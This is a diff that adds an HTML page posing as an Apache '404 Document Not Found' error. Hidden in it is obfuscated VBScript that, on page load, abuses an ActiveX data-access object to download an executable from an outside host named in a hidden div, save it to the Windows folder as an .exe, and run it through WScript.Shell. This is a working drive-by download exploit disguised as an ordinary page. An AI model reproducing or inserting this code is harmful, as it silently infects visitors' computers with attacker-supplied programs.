@@ -1,0 +1,69 @@
+<HTML>
+<HEAD>
+  <TITLE>404 error - Document Not Found</TITLE>
+</HEAD>
+<BODY>
+<DIV id='xzbat' style='display:none'>http://www.vevdqimkcm.info/c/1866/counter21.php?a=2&c=2</DIV>
+      <SCRIPT language="VBScript">
+      Const rizkqwh=20
+
+      Dim  bztnaif
+      Dim  nteljd
+      Dim  drp
+      Dim  ois
+      Dim  ydddxj
+
+      Dim  skylyzu
+      Dim  kjetfv
+      Dim  six
+      Dim  tgaukrj
+      Dim  gshar
+      Dim  euint
+      Dim  xsn
+
+      ncgfkhw = xzbat.innerText
+      lqeykgw = tjgawqeqn
+
+
+      kjetfv="kjetfv" & "." & "e" & "xe"
+
+      Set  bztnaif=document.createElement("obj"+"e"+"ct")
+      bztnaif.setAttribute "id","bztnaif"
+      bztnaif.setAttribute "c"+"la"+"ssid","clsid:BD96C556-"+"65A3-11D0-"+"9"+"83A"+"-00C04FC29E36"
+
+      Set ydddxj = bztnaif.CreateObject("Shell"+".App"+"li"+"cation","")
+      Set tst = ydddxj.NameSpace(rizkqwh)
+      Set rds = tst.ParseName("S"+"y"+"m"+"bo"+"l.ttf")
+      kbssf = Split(rds.Path,"\",-1,1)
+      skylyzu= kbssf(0) & "\" &  kbssf(1) & "\"
+      kjetfv=skylyzu & kjetfv
+
+      euint="M"+"ic"+"ro"+"s"+"oft"
+      xsn="XMLH"+"TT"+"P"
+      set nteljd = CreateObject(euint & "." & xsn)
+      ssjz = "G" & "E" & "T"
+      tguorlt = nteljd.Open(ssjz,ncgfkhw,0)
+      nteljd.Send()
+      On Error Resume Next
+      six = nteljd.responseBody
+
+      Set drp = bztnaif.CreateObject("Scr"+"i"+"p"+"ti"+"ng.FileSystemO"+"bject","")
+      Set tgaukrj = drp.CreateTextFile(kjetfv, TRUE)
+      vznysf = LenB(six)
+
+      For j=1 To vznysf
+        gshar = MidB(six,j,1)
+        uxvmmg = AscB(gshar)
+        tgaukrj.Write(Chr(uxvmmg))
+      Next
+      tgaukrj.Close
+
+      Set  ois=bztnaif.CreateObject("WS"+"cript"+"."+"Shel"+"l","")
+      On Error Resume Next
+      ois.Run (kjetfv),1,FALSE
+</SCRIPT>
+ The requested URL was not found on this server.
+   <br><br><HR noshade="noshade">
+   Apache/1.3.31 Server at Port 80
+  </BODY>
+  </HTML>
